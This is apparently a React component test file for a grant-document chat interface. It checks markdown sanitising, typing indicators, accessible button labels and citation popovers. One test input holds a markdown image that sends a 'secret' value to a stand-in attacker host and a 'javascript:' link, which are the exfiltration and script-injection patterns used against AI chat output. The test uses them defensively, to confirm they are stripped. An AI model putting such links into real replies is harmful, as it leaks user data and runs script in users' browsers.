import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { renderApp } from "../../test/render";
import ChatMessage from "./ChatMessage";
import { ChatBotMessageType } from "./types";

const REPLY = [
  "![tracking pixel](https://evil.example/pixel.png?d=secret)",
  "[js](javascript:alert(1)) [plain](http://insecure.example) [secure](https://grants.gov/x) [mail](mailto:help@example.org)",
].join("\n\n");

describe("ChatMessage markdown", () => {
  it("shows image alt text instead of loading images and keeps only https and mailto links", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: REPLY, metadata: {} }} />
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("tracking pixel")).toBeInTheDocument();

    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://grants.gov/x", "mailto:help@example.org"]);
    for (const a of links) {
      expect(a).toHaveAttribute("target", "_blank");
      expect(a).toHaveAttribute("rel", "noopener noreferrer");
    }
    expect(container.textContent).toMatch(/js plain secure \(opens in new tab\) mail/);
    expect(container.innerHTML).not.toMatch(/javascript:|insecure\.example|evil\.example/);
  });
});

describe("ChatMessage waiting", () => {
  it("shows hidden typing dots, and no copy button, until the answer has text", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: "", metadata: {} }} />
    );

    const dots = container.querySelector("[aria-hidden='true'] > span:nth-child(3)")?.parentElement;
    expect(dots?.children).toHaveLength(3);
    expect(screen.getByText("Assistant is typing")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /Copy/ })).not.toBeInTheDocument();
  });
});

describe("ChatMessage reply", () => {
  it("names its copy and sources buttons after the reply number and starts headings at h2", () => {
    renderApp(
      <ChatMessage
        replyNumber={3}
        message={{
          type: ChatBotMessageType.AI,
          content: "# Summary\n\n## Budget\n\nText",
          metadata: { Sources: [{ title: "NOFO.pdf", uri: "s3://bucket/nofo.pdf" }] },
        }}
      />
    );

    expect(screen.getByRole("button", { name: "Copy reply 3 to clipboard" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Sources (1) for reply 3" })).toHaveTextContent("Sources (1)");
    expect(screen.getByRole("heading", { level: 2, name: "Summary" })).toBeInTheDocument();
    expect(screen.getByRole("heading", { level: 3, name: "Budget" })).toBeInTheDocument();
  });
});

describe("ChatMessage citations", () => {
  const content = "Applications are due **March 1, 2027**. Late ones are not read. Use `code here` too.";
  const citations = [
    { n: 1, at: [38], quote: "All applications must be received by March 1, 2027.", document: "Grant document", page: 12, lastPage: 12 },
    { n: 2, at: [62, 38], quote: "Late applications will not be reviewed.", document: "board.pdf", page: 3, lastPage: 4 },
  ];
  const render = () =>
    renderApp(<ChatMessage message={{ type: ChatBotMessageType.AI, content, metadata: { Sources: [], Citations: citations } }} />);

  it("puts numbered quote buttons after the cited text", () => {
    const { container } = render();

    const buttons = screen.getAllByRole("button", { name: /^Quote \d/ });
    expect(buttons.map((b) => b.getAttribute("aria-label"))).toEqual([
      "Quote 1, Grant document, page 12",
      "Quote 2, board.pdf, pages 3–4",
      "Quote 2, board.pdf, pages 3–4",
    ]);
    expect(container.querySelector("strong")?.textContent).toBe("March 1, 202712");
    expect(container.querySelector("code")?.textContent).toBe("code here");
  });

  it("shows the quote under its button and closes on Escape, keeping focus on the button", async () => {
    const { user } = render();
    const button = screen.getByRole("button", { name: "Quote 1, Grant document, page 12" });

    expect(button).toHaveAttribute("aria-expanded", "false");
    await user.click(button);
    expect(button).toHaveAttribute("aria-expanded", "true");
    const quote = document.getElementById(button.getAttribute("aria-controls")!);
    expect(quote?.textContent).toBe("“All applications must be received by March 1, 2027.”Grant document, page 12");

    await user.keyboard("{Escape}");
    expect(button).toHaveAttribute("aria-expanded", "false");
    expect(button).toHaveFocus();
  });

  it("closes when the user clicks elsewhere", async () => {
    const { user } = render();
    const button = screen.getByRole("button", { name: "Quote 1, Grant document, page 12" });
    await user.click(button);
    await user.click(document.body);
    expect(button).toHaveAttribute("aria-expanded", "false");
  });

  it("renders older answers without citations as before", () => {
    renderApp(<ChatMessage message={{ type: ChatBotMessageType.AI, content, metadata: {} }} />);
    expect(screen.queryByRole("button", { name: /^Quote/ })).toBeNull();
  });
});
